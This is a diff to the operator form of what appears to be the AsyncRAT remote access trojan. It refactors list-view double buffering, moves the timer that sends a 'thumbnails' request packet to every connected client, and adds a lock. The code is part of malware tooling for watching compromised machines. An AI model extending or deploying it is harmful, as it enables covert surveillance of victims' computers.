@@ -74,10 +74,10 @@ namespace AsyncRAT_Sharp
 
         private async void Form1_Load(object sender, EventArgs e)
         {
-            System.Reflection.PropertyInfo aProp = typeof(System.Windows.Forms.Control)
-    .GetProperty("DoubleBuffered", System.Reflection.BindingFlags.NonPublic |
-    System.Reflection.BindingFlags.Instance);
-            aProp.SetValue(listView1, true, null);
+
+            ListviewDoubleBuffer.Enable(listView1);
+            ListviewDoubleBuffer.Enable(listView2);
+            ListviewDoubleBuffer.Enable(listView3);
 
             CheckFiles();
             lvwColumnSorter = new ListViewColumnSorter();
@@ -211,36 +211,32 @@ namespace AsyncRAT_Sharp
             this.Opacity = 0.95;
         }
 
-        private static System.Threading.Timer Tick { get; set; }
-        private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
+        private void GetThumbnails_Tick(object sender, EventArgs e)
         {
-            if (Tick == null && listView1.Items.Count > 0)
+            if (listView1.Items.Count > 0)
             {
-                Tick = new System.Threading.Timer(GetThumbnails, null, 2500, 5000);
+                try
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "thumbnails";
+
+                    foreach (ListViewItem itm in listView1.Items)
+                    {
+                        Clients client = (Clients)itm.Tag;
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
+                }
+                catch { }
             }
         }
-        private void GetThumbnails(object obj)
-        {
-            if (Program.form1.listView3.InvokeRequired)
-            {
-                Program.form1.listView3.BeginInvoke((MethodInvoker)(() =>
-                {
-                    if (listView1.Items.Count > 0)
-                    {
-                        try
-                        {
-                            MsgPack msgpack = new MsgPack();
-                            msgpack.ForcePathObject("Packet").AsString = "thumbnails";
 
-                            foreach (ListViewItem itm in listView1.Items)
-                            {
-                                Clients client = (Clients)itm.Tag;
-                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                            }
-                        }
-                        catch { }
-                    }
-                }));
+        private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.Items.Count > 0)
+            {
+                GetThumbnails.Stop();
+                GetThumbnails.Start();
+                GetThumbnails.Tag = (object)"started";
             }
         }
 
@@ -248,8 +244,8 @@ namespace AsyncRAT_Sharp
         {
             try
             {
-                Tick?.Dispose();
-                Tick = null;
+                GetThumbnails.Tag = (object)"stopped";
+                GetThumbnails.Stop();
                 listView3.Items.Clear();
                 ThumbnailImageList.Images.Clear();
                 foreach (ListViewItem itm in listView1.Items)
@@ -529,7 +525,10 @@ namespace AsyncRAT_Sharp
         {
             try
             {
-                listView2.Items.Clear();
+                lock (Settings.Listview2Lock)
+                {
+                    listView2.Items.Clear();
+                }
             }
             catch { }
         }
